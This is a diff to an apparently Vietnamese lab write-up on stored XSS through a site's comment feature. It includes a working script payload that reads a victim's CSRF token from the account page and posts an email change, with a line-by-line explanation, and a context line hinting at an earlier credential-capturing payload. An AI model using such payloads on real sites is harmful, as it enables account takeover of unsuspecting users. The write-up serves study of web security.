@@ -600,18 +600,39 @@ body:username.value+':'+this.value
 <h1>---------------------------------------------------------</h1>
 <br>
 
+![image](https://github.com/user-attachments/assets/dff34895-6dbc-411b-8dfe-84abbbdef2f3)
 
+Khi đổi email là nó thay đổi mã csrf, và nó xác nhận khi comment 
 
+![image](https://github.com/user-attachments/assets/e66839fd-7efd-4f0b-a0fa-2ae65a2c1adc)
 
+Tôi test chức năng comment của trang thì có xảy ra xss, tức có thể chạy được
 
+![image](https://github.com/user-attachments/assets/1b3e3ac4-94e9-4fd3-83b8-317b839c1db2)
 
+Mục tiêu bây giờ là khi người dùng xem comment và payload sẽ lấy csrf, sau đó mang đi đổi email,
 
+![image](https://github.com/user-attachments/assets/6f3e3470-35d0-4eb7-9996-b5278f647f8c)
 
+![image](https://github.com/user-attachments/assets/3eb390e8-df97-4725-b813-568f7a4c551b)
 
+`<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>`<br>
+đang tạo XMLHttpRequest để gửi 1 request HTTP với method get đến /my-account, sau khi nhận được phản hồi thì nó sẽ chạy hàm handleResponse() để xử lý dữ liệu<br>
+`var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];` cái này là kiểm tra xem ở cái nội dung trả về để lấy cái giá trị của csrf<br>
+say khi lấy được thì `var changeReq = new XMLHttpRequest();` sẽ tạo 1 request mới `changeReq.open('post', '/my-account/change-email', true);` nhảy vào `/my-account/change-email` với method post, `changeReq.send('csrf='+token+'&email=test@test.com')` gửi kèm token đi theo và cái email để thay đổi email
 
-
-
-
+![image](https://github.com/user-attachments/assets/f1e494e6-43fc-4fd3-baba-4b2512124bc4)
 
 
 
